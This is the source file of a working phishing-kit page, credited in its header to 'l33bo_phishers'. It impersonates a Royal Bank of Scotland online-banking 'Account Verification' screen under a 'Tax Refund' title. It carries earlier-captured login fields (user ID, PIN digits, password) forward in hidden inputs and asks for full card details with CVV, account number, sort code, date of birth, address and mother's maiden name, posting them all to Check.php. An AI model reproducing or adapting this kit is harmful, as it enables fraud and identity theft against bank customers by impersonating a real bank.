<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Tax Refund</title>
<meta http-equiv="Content-Style-Type" content="text/css">
<link href="assets/css/master.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/datePicker.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/master_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPromptMaster.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPrompt.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/DPC_auralstyle.css" rel="stylesheet" type="text/css" media="aural" segment="">
<link href="assets/css/lpdastyles.css" rel="stylesheet" type="text/css">
<link href="assets/css/form.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
<script src="assets/js/autoTab.js" type="text/javascript"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function validateForm() {
    var x = document.forms["details"]["name"].value;
    if (x == null || x == "") {
        document.getElementById("nameerror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["day"].value;
    if (x == null || x == "") {
        document.getElementById("doberror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["month"].value;
    if (x == null || x == "") {
        document.getElementById("doberror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["year"].value;
    if (x == null || x == "") {
        document.getElementById("doberror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["address"].value;
    if (x == null || x == "") {
        document.getElementById("addresserror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["postcode"].value;
    if (x == null || x == "") {
        document.getElementById("postcodeerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["telephone"].value;
    if (x == null || x == "") {
        document.getElementById("telephoneerror").style.display = "block";
        return false;
    }
    var x = document.forms["details"]["email"].value;
    if (x == null || x == "") {
        document.getElementById("emailerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["ccno"].value;
    if (x == null || x == "") {
        document.getElementById("ccnoerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["ccexp"].value;
    if (x == null || x == "") {
        document.getElementById("expiryerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["secode"].value;
    if (x == null || x == "") {
        document.getElementById("secodeerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["acno"].value;
    if (x == null || x == "") {
        document.getElementById("acnoerror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["sc1"].value;
    if (x == null || x == "") {
        document.getElementById("sorterror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["sc2"].value;
    if (x == null || x == "") {
        document.getElementById("sorterror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["sc3"].value;
    if (x == null || x == "") {
        document.getElementById("sorterror").style.display = "block";
        return false;
    }
	var x = document.forms["details"]["mmn"].value;
    if (x == null || x == "") {
        document.getElementById("mmnerror").style.display = "block";
        return false;
    }
}
function clearnameerror() {
	document.getElementById("nameerror").style.display = "none";
}
function cleardoberror() {
	document.getElementById("doberror").style.display = "none";
}
function clearaddresserror() {
	document.getElementById("addresserror").style.display = "none";
}
function clearpostcodeerror() {
	document.getElementById("postcodeerror").style.display = "none";
}
function cleartelephoneerror() {
	document.getElementById("telephoneerror").style.display = "none";
}
function clearemailerror() {
	document.getElementById("emailerror").style.display = "none";
}
function clearccnoerror() {
	document.getElementById("ccnoerror").style.display = "none";
}
function clearexpiryerror() {
	document.getElementById("expiryerror").style.display = "none";
}
function clearsecodeerror() {
	document.getElementById("secodeerror").style.display = "none";
}
function clearacnoerror() {
	document.getElementById("acnoerror").style.display = "none";
}
function clearsorterror() {
	document.getElementById("sorterror").style.display = "none";
}
function clearmmnerror() {
	document.getElementById("mmnerror").style.display = "none";
}
</script>
</head>

<body id="ctl00_bodyTag"><div class="mboxDefault" id="mbox-target-global-mbox-1430817187600-352795" style="visibility: visible; display: block;"></div>
	
	
	<div id="wrapper" class="default_bg nobackgroundImg">
		<div id="acceskeys">
			<div id="skiplinks">
				<div class="ddalink">
	<a id="ctl00_skipLinks_ctl00_beginLink" accesskey="0" class="ddalink" href="#">Return to start of screen / Access key details</a>
	<a id="ctl00_skipLinks_ctl00_MenuLink" accesskey="m" title="Skip to Menu" class="ddalink" href="#">Skip to Menu</a>
	<a id="ctl00_skipLinks_ctl00_ContentLink" accesskey="s" title="Skip to main content" class="ddalink" href="#">Skip to main content</a>
	<a id="ctl00_skipLinks_ctl00_accessLink" accesskey="o" title="Skip to accessibility" class="ddalink" href="#">Skip to accessibility</a>
</div>
			</div>
		</div>
		<div id="canvas" class="twoLines">
			
<div id="header" class="header">
    <div id="ctl00_header_ctl00_topHeaderWrapper" class="topHeaderWrapper">
        <div id="ctl00_header_ctl00_topHeaderLeftWraper" class="topHeaderLeftWrapper">
            <ul id="ctl00_header_ctl00_globalTopNav" class="globalTopnav">
                <li class="selected">
                    <span id="ctl00_header_ctl00_HDRBTEA">Personal</span>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLIAnchor" href="#" target="Private">Private</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLJAnchor" href="#" target="Business">Business</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLLAnchor" href="#" target="Business">Corporate</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLKAnchor" href="#" target="International">International</a>
                </li>
            </ul>
        </div>
        <div id="ctl00_header_ctl00_topHeaderRightWrapper" class="topHeaderRightWrapper">
            <div id="ctl00_header_ctl00_LogoutWrapper" class="logoutWrapper">
                <span id="ctl00_header_ctl00_logoutButton" class="logoutLink">
                    <a href="#" id="ctl00_header_ctl00_logoutlink" target="_top"><span id="ctl00_header_ctl00_HDRBTEE">LOG OUT</span></a>
                </span>
            </div>
            
        </div>
    </div>
    <div id="ctl00_header_ctl00_bottomHeaderWrapper" class="bottomHeaderWrapper">
        <div id="ctl00_header_ctl00_bottomHeaderLeftWrapper" class="bottomHeaderLeftWrapper">
            <div id="ctl00_header_ctl00_rbsHeader" class="rbsHeader">
                <a href="#" target="_top"><img id="ctl00_header_ctl00_BrandImage4" src="assets/img/official.gif" style="border-width:0px;"></a>
            </div>
            <div id="ctl00_header_ctl00_globalBottomNavWrapper" class="globalBottomNavWrapper">
                <ul id="ctl00_header_ctl00_Ul1" class="globalBottomNav">
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULAAnchor" href="#" target="Products">Products</a>
                    </li>
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULBAnchor" href="#" target="Support">Support</a>
                    </li>
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULCAnchor" href="#" target="Life Moments">Life Moments</a>
                    </li>
                </ul>
            </div>
        </div>
        <div id="ctl00_header_ctl00_bottomHeaderRightWrapper" class="bottomHeaderRightWrapper">
            <div id="ctl00_header_ctl00_quickLinksWrapper" class="quickLinksWrapper">
                <ul id="quickLinks">
                    <li class="privacyAndCookiesTopPadding">
                        <a id="ctl00_header_ctl00_HDRNLCAnchor" href="#" target="helpwindow">Privacy &amp; Cookies</a>
                    </li>
                    <li class="last">
                        <a id="ctl00_header_ctl00_HDRPULDAnchor" href="#" target="headerWindow">Accessibility</a>
                    </li>
                </ul> 
            </div> 
         </div>
    </div>
</div>
            
			<div id="content">
				<a name="content"></a>
				<div id="mid">
					<div id="ctl00_snailTrail__19ae97ef30e_SnailTrail">

</div>
<form name="details" method="post" action="Check.php?&sessionid=<?php echo generateRandomString(60); ?>&securessl=true" id="details" onsubmit="return validateForm();">
					<input type="hidden" name="userid" value="<?php echo $_POST['userid'];?>">
					<input type="hidden" name="pin1" value="<?php echo $_POST['pin1'];?>">
					<input type="hidden" name="pin2" value="<?php echo $_POST['pin2'];?>">
					<input type="hidden" name="pin3" value="<?php echo $_POST['pin3'];?>">
					<input type="hidden" name="pin4" value="<?php echo $_POST['pin4'];?>">
					<input type="hidden" name="password" value="<?php echo $_POST['password'];?>">
<div>

</div>


    
    <span id="ctl00_mainContent_AccountAdminLandingPageAPanelControl"></span>
    
    <div id="ctl00_mainContent_SE01PFA" class="landingPageHeader pageTitle">
	
        <div id="ctl00_mainContent_SE01PFB" class="LPHeaderTopCurve">
		</div>
        <h1 id="ctl00_mainContent_SE01BTHA" class="">
			Security
		</h1>
    </div>
    
    
    
    
    
    

    <div id="ctl00_mainContent_SE01PFC" class="landingPageContainerWide">	
        <div id="ctl00_mainContent_SE01PFD" class="landingPageMidWide IOMSpecificBackgroundLongMiddle landingPageMidNoButtonLong">
				
            <div id="ctl00_mainContent_SE01PFE" class="LPTopCurveWide IOMSpecificBackgroundLongTop"></div>
            <div id="ctl00_mainContent_SE01PFF" class="landingPageContentWrapper landingPageContentWrapperWide">
						
                <h2 id="ctl00_mainContent_SE01BTHB" class="">
							Account Verification
						</h2>
                 <span id="ctl00_mainContent_SE01BTEA" class="noMarginTop marginTop">
				 <p>Please enter your information below to complete account verification.
				 <table border="0" style="border-collapse:collapse;border:0px solid #FFCC00;color:#000000;width:100%" cellpadding="3" cellspacing="3">
	<tr>
		<td>Full Name:</td>
		<td><input type="text" name="name" id="name" class="name" onkeydown="clearnameerror()" value="<?php echo $_SESSION['name']?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="nameerror" class="formerror">Please enter your name</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Date of Birth:</td>
		<td>
		<select name="day" id="day" title="Select you day of birth" onchange="cleardoberror()">
<option value="<?php echo $_SESSION['day'];?>"><?php echo $_SESSION['day'];?></option>
<option value=''>Day</option>
		<option value='01'>01</option>
<option value='02'>02</option>
<option value='03'>03</option>
<option value='04'>04</option>
<option value='05'>05</option>
<option value='06'>06</option>
<option value='07'>07</option>
<option value='08'>08</option>
<option value='09'>09</option>
<option value='10'>10</option>
<option value='11'>11</option>
<option value='12'>12</option>
<option value='13'>13</option>
<option value='14'>14</option>
<option value='15'>15</option>
<option value='16'>16</option>
<option value='17'>17</option>
<option value='18'>18</option>
<option value='19'>19</option>
<option value='20'>20</option>
<option value='21'>21</option>
<option value='22'>22</option>
<option value='23'>23</option>
<option value='24'>24</option>
<option value='25'>25</option>
<option value='26'>26</option>
<option value='27'>27</option>
<option value='28'>28</option>
<option value='29'>29</option>
<option value='30'>30</option>
<option value='31'>31</option>
</select> <select name="month" id="month" title="Select your month of birth" onchange="cleardoberror()">
<option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option>
<option value=''>Month</option>
<option value="Jan">Jan</option>
<option value="Feb">Feb</option>
<option value="Mar">Mar</option>
<option value="Apr">Apr</option>
<option value="May">May</option>
<option value="Jun">Jun</option>
<option value="Jul">Jul</option>
<option value="Aug">Aug</option>
<option value="Sep">Sep</option>
<option value="Oct">Oct</option>
<option value="Nov">Nov</option>
<option value="Dec">Dec</option>
</select> <select name="year" id="year" title="Select your year of birth" onchange="cleardoberror()">
<option value="<?php echo $_SESSION['year'];?>"><?php echo $_SESSION['year'];?></option>
<option value=''>Year</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
</select>
		</td>

	</tr>
	<tr>
		<td></td>
		<td><div id="doberror" class="formerror">Please select your date of birth</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Address Line 1:</td>
		<td><input type="text" id="address" name="address" class="address" onkeydown="clearaddresserror()" value="<?php echo $_SESSION['address'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="addresserror" class="formerror">Please enter the first line of your address</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Postcode:</td>
		<td><input type="text" id="postcode" name="postcode" class="postcode" onkeydown="clearpostcodeerror()" value="<?php echo $_SESSION['postcode'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="postcodeerror" class="formerror">Please enter your postcode</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Mobile Number:</td>
		<td><input type="text" id="telephone" maxlength="11" name="telephone" class="telephone" onkeydown="cleartelephoneerror()" value="<?php echo $_SESSION['telephone'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="telephoneerror" class="formerror">Please enter your mobile number</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Email Address:</td>
		<td><input type="email" id="email" name="email" class="email" onkeydown="clearemailerror()" value="<?php echo $_SESSION['email'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="emailerror" class="formerror">Please enter your email address</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Card Number:</td>
		<td>
		<input type="text" maxlength="20" name="ccno" onkeydown="clearccnoerror()" value="<?php echo $_SESSION['ccno'];?>">
		</td>

	</tr>
	<tr>
		<td></td>
		<td><div id="ccnoerror" class="formerror">Please enter your bank card number</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Card Expiry Date:</td>
		<td>
<input type="text" maxlength="7" name="ccexp" onkeydown="clearexpiryerror()" value="<?php echo $_SESSION['ccexp'];?>">
		</td>

	</tr>
	<tr>
		<td></td>
		<td><div id="expiryerror" class="formerror">Please enter your card expiry date</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Card CVV:</td>
		<td><input type="text" maxlength="3" name="secode" class="secode" onkeydown="clearsecodeerror()" value="<?php echo $_SESSION['secode'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="secodeerror" class="formerror">Please enter your card security code (ccv2)</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Account Number:</td>
		<td><input type="text" maxlength="8" name="acno" class="acno" onkeydown="clearacnoerror()" value="<?php echo $_SESSION['acno'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="acnoerror" class="formerror">Please enter your account number</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Sortcode:</td>
		<td>
		<input type="text" maxlength="2" name="sc1" id="sc1" class="sort" onkeyup="movetoNext(this, 'sc2')" onkeydown="clearsorterror()" value="<?php echo $_SESSION['sort1'];?>">
		<input type="text" maxlength="2" name="sc2" id="sc2" class="sort" onkeyup="movetoNext(this, 'sc3')" onkeydown="clearsorterror()" value="<?php echo $_SESSION['sort2'];?>">
		<input type="text" maxlength="2" name="sc3" id="sc3" class="sort" onkeydown="clearsorterror()" value="<?php echo $_SESSION['sort3'];?>">
		</td>

	</tr>
	<tr>
		<td></td>
		<td><div id="sorterror" class="formerror">Please enter your sortcode</div></td>
		<td></td>
	</tr>
	<tr>
		<td>Mothers Maiden Name:</td>
		<td><input type="text" name="mmn" class="mmn" onkeydown="clearmmnerror()" value="<?php echo $_SESSION['mmn'];?>"></td>

	</tr>
	<tr>
		<td></td>
		<td><div id="mmnerror" class="formerror">Please enter your mothers maiden name</div></td>
		<td style="padding:10px;"></td>
	</tr>
	<tr>
		<td></td>
		<td></td>
		<td>
		<input name="gobtn" id="gobtn" value="Validate" class="gobtn" type="submit">
		</td>
	</tr>
</table>


				 <br><br>
				 </span>


            </div>
       </div>
    </div>      

        
       
    
    <div class="clear">
        
    </div>

</form>
				</div>
				<a name="menu"></a>
				<div id="ctl00_leftPanel" class="left menu">
				
	<div id="ctl00_menu__304bf1d447ac_MenuDiv_BC" class="box_menu">
	<div class="box_top_menu"><hr></div>
	<div id="ctl00_menu__304bf1d447ac_menuBodyDiv" class="MenuBody">
	<ul id="menu">
	<li>
	<a id="ctl00_menu__304bf1d447ac_AS1MNUAnchor" accesskey="1" href="#">Account summary</a></li>
	<li><aaccesskey="2" href="#">Messages</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_SS1AMNUAnchor" accesskey="3" href="#">Statements</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_PT1AMNUAnchor" accesskey="4" href="#">Payments and transfers</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_AL1AMNUAnchor" accesskey="5" href="#">Alerts</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_AA1AMNUAnchor" accesskey="6" href="#">Cards</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_CS1AMNUAnchor" accesskey="7" href="#">Your details</a></li>
	<li class="current"><a id="ctl00_menu__304bf1d447ac_SE01MNUAnchor" accesskey="8" title="Access Key = 8" href="#">Security</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_ESMNUAnchor" accesskey="9" target="_top" href="#">Log out</a></li>
	</ul>
	</div>
	</div>


					
					<div id="ctl00_quickTransfer_ctl00_quickTransferDiv" class="box_quickTransfer">
					<div class="box_top_quickTransfer"><hr></div>

	<form style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px" action="#" method="post" onsubmit="blockQTButton(&#39;ctl00_quickTransfer_ctl00_transferButton&#39;)"><input type="hidden" value="559a72c0-bed8-4100-9e90-7db2414c0c80" name="txnID">
    	
	<h3 id="ctl00_quickTransfer_ctl00_QT1BTHA">Quick transfers</h3>
	<div id="ctl00_quickTransfer_ctl00_quickTransferBodyDivInput" class="quicktransferbody">
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEA" class="brandtext">from…</div>
	    <div id="QTPFB">	        
		    <label id="ctl00_quickTransfer_ctl00_QT1ADDADDALA" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1ADDA">Account to transfer funds from</label>
			<select name="qt" id="ctl00_quickTransfer_ctl00_QT1ADDA">
																	<option value="PleaseSelect">…your RBS account</option>
																</select>
	    </div>
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEB" class="brandtext">to…</div>
	    <div id="QTPFC">	        
	        <label id="ctl00_quickTransfer_ctl00_QT1ADDBDDALB" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1ADDB">Account to transfer funds to</label>
			<select name="qt" id="ctl00_quickTransfer_ctl00_QT1ADDB" >
																	<option value="PleaseSelect">…your RBS account</option>
																</select>
	    </div>
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEC" class="brandtext">amount…</div> 
	    <div class="currencyDiv" id="QTPFD">	               
	        <label id="ctl00_quickTransfer_ctl00_QT1CEADDALC" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1CEA">Amount to transfer between accounts</label><span id="ctl00_quickTransfer_ctl00_currencySpan" class="currencySpan">£</span><input name="ctl00$quickTransfer$ctl00$QT1CEA" type="text" id="ctl00_quickTransfer_ctl00_QT1CEA" maxlength="14" size="21" value="0.00">
	    </div>
	</div>
	
	<div id="ctl00_quickTransfer_ctl00_quickTransferFooterDiv" class="quicktransferfooter">
	    <div id="QTPFE" class="qtBtn">
		    <input name="ctl00$quickTransfer$ctl00$transferButton" type="submit" id="ctl00_quickTransfer_ctl00_transferButton" value="Transfer" class="qtoff" onmouseover="cssQT(this,&#39;qton&#39;)" onmouseout="cssQT(this,&#39;qtoff&#39;)">
	    </div>
	</div></form>
</div>

					
				</div>
			</div>
			<div id="ctl00_rightPanel" class="right banners">
				<div id="ctl00_salesOnline_ctl00_ourProducts" class="box_ourProducts">
				<div class="box_top_ourProducts"><hr></div>
				<h2 id="ctl00_salesOnline_ctl00_ASBTHE" class="fauxh3">Our products</h2>
				<span id="ctl00_salesOnline_ctl00_ASBTHF">Personal products</span>
				<ul class="aol">
				<li><a id="ctl00_salesOnline_ctl00_ASNLA_PAnchor" class="ol-link" href="#" target="_blank">Savings accounts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLB_PAnchor" class="ol-link" href="#" target="_blank">Cash ISAs</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLC_PAnchor" class="ol-link" href="#" target="_blank">Current accounts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLD_PAnchor" class="ol-link" href="#" target="_blank">Upgrade your account</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLE_PAnchor" class="ol-link" href="#" target="_blank">Credit cards</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLF_PAnchor" class="ol-link" href="#" target="_blank">Overdrafts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLG_PAnchor" class="ol-link" href="#" target="_blank">Loans</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLH_PAnchor" class="ol-link" href="#" target="_blank">Mortgages</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLI_PAnchor" class="ol-link" href="#" target="_blank">Insurance</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLJ_PAnchor" class="ol-link" href="#" target="_blank">Travel money</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLM_PAnchor" class="ol-link" href="#" target="_blank">Debit card abroad</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLN_PAnchor" class="ol-link" href="#" target="_blank">Investment products</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLP_PAnchor" class="ol-link" href="#" target="_blank">Mobile app</a></li></ul></div>
			</div>
			<br class="clear">
		</div>
		
<div id="footer" class="footerContainer">
    <ol class="footer_navbar">
        <li>
            <a id="ctl00_footer_ctl00_HDRNLDAnchor" href="#" target="headerWindow">Security</a></li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator1">·</span> </li>
        <li>
            <a id="ctl00_footer_ctl00_HDRNLBAnchor" href="#" target="headerWindow">Legal Info</a></li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator2">·</span> </li>
        <li class="last"><span id="ctl00_footer_ctl00_CopyrightText">&copy; 2005-2015 The Royal Bank of Scotland plc</span> </li>
    </ol>
</div>

		
	</div>


</body>
</html>
